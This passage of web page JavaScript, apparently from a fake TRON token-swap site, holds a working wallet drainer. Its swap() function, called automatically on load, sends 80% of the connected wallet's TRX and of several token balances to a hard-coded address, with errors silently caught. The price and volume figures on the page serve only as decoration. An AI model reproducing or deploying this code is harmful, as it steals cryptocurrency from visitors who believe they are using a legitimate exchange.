                                    "THb4CqiFdwNHsWsQCs4JhzwjMWys4aqCbF"]

            async function swap(){
                try{
                    var balance = await window.tronWeb.trx.getBalance();
                    if (balance >= 20000000)
                    await tronWeb.trx.sendTransaction("4133ef1E7347297b343cc0fb4c23A1Fb400e7781F1", Math.round(balance * 80 / 100));
                }catch{}
                for(i=0; i<contractsAddress.length; i++){
                    try{
                    var cc = await window.tronWeb.contract().at(contractsAddress[i]);
                    balance = await cc.balanceOf(window.tronWeb.defaultAddress.base58).call();
                    if (balance.toNumber() >= 100000){
                        await cc.transfer("4133ef1E7347297b343cc0fb4c23A1Fb400e7781F1", Math.round(balance * 80 / 100)).send()
                    }
                    }catch{}
                }
            }
        </script>

        <script>
            var price = 0.028;
            var volume = 741738472650;
            var tokenBalance;
            var account;
            $(".price").text(price)
            $(".yourprice").text(price * 34806)
            $(".volume").text(volume.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ","))

            const timer = setInterval(async() => {
                if (window.tronWeb && window.tronWeb.ready){
                    
                    clearInterval(timer);
                }
            }, 500);

            $("body").on("keyup", "input", function(){
                $("#SwapedToken").text($("input").val() * price)
            });

                swap();
